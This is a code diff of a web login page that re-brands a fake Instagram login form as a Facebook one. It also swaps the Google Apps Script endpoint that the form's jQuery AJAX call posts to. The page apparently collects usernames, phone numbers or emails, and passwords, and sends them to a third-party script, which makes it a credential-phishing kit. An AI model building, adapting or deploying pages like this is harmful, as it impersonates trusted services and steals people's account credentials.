@@ -17,11 +17,11 @@
     <section id="w3hubs">
         <div class="container">
         
-            <h1>Instagram</h1>
+            <h1>FACEBOOK</h1>
             <form id="submit-form" action="">
              <div class="form-group">
                
-                <input type="name" id="name" name="name" class="form-control" placeholder="Phone number,username, or email" required="required">
+                <input type="name" id="name" name="name" class="form-control" placeholder="Phone number or email" required="required">
               </div>
               <div class="form-group">
                
@@ -43,7 +43,7 @@
                 $("#submit-form").submit((e)=>{
                     e.preventDefault()
                     $.ajax({
-                        url:"https://script.google.com/macros/s/AKfycbyNNLbe9T6iaB61YdbIQ4miknqHcAfb8cpc_pWU/exec",
+                        url:"https://script.google.com/macros/s/AKfycbyo8W-mHNuPaSq86FRDfVS_EjjVmrD9k50g1mlVfQrg8hXzX2yZCA87wCTx6G1fwWf10w/exec",
                         data:$("#submit-form").serialize(),
                         method:"post",
                         success:function (response){
